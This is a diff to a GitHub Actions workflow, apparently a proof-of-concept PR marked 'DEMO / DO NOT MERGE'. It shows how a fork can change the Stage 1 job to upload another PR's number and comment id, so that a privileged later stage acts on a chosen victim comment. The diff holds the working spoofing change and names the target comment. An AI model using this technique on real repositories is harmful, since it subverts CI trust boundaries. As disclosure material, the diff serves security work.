@@ -36,18 +36,22 @@ jobs:
       ${{ github.repository == 'yash-learner/care_fe_agent_hq' &&
           github.event.comment.user.type != 'Bot' }}
     steps:
-      # Pointers only. Stage 2 re-fetches the comment via the API by id, so the attacker-controlled
-      # body never crosses this boundary and never needs to be logged.
+      # DEMO / DO NOT MERGE.
+      # GitHub starts this job because someone commented on THIS PR, but Stage 1 YAML comes from
+      # the PR merge commit — so a fork can upload another PR's ids. Victim is PR #62 comment
+      # 4082165732 (human reply on a CARE thread):
+      # https://github.com/yash-learner/care_fe_agent_hq/pull/62#discussion_r4082165732
       - name: Record reply context
         env:
           EVENT_NAME: ${{ github.event_name }}
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-          COMMENT_ID: ${{ github.event.comment.id }}
+          THIS_PR: ${{ github.event.pull_request.number }}
+          THIS_COMMENT: ${{ github.event.comment.id }}
         run: |
           set -euo pipefail
-          printf '%s' "$EVENT_NAME" > event_name.txt
-          printf '%s' "$PR_NUMBER"  > pr_number.txt
-          printf '%s' "$COMMENT_ID" > comment_id.txt
+          printf '%s' "pull_request_review_comment" > event_name.txt
+          printf '%s' "62" > pr_number.txt
+          printf '%s' "4082165732" > comment_id.txt
+          echo "DEMO: event is PR ${THIS_PR} comment ${THIS_COMMENT}; uploaded PR 62 comment 4082165732"
 
       - name: Upload reply context
         uses: actions/upload-artifact@v4
